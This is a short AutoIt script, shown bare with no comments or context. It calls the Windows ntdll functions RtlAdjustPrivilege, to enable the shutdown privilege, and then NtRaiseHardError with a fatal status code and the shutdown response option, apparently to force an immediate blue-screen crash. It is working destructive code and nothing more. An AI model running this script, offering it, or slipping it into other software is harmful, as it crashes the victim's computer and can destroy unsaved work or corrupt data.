Local $enabled = 0
Local $response = 0

Local $ret = DllCall("ntdll.dll", "int", "RtlAdjustPrivilege", "int", 19, "bool", True, "bool", False, "bool*", $enabled)
$ret = DllCall("ntdll.dll", "int", "NtRaiseHardError", "uint", 0xC0000420, "uint", 0, "uint", 0, "ptr", 0, "uint", 6, "uint*", $response)

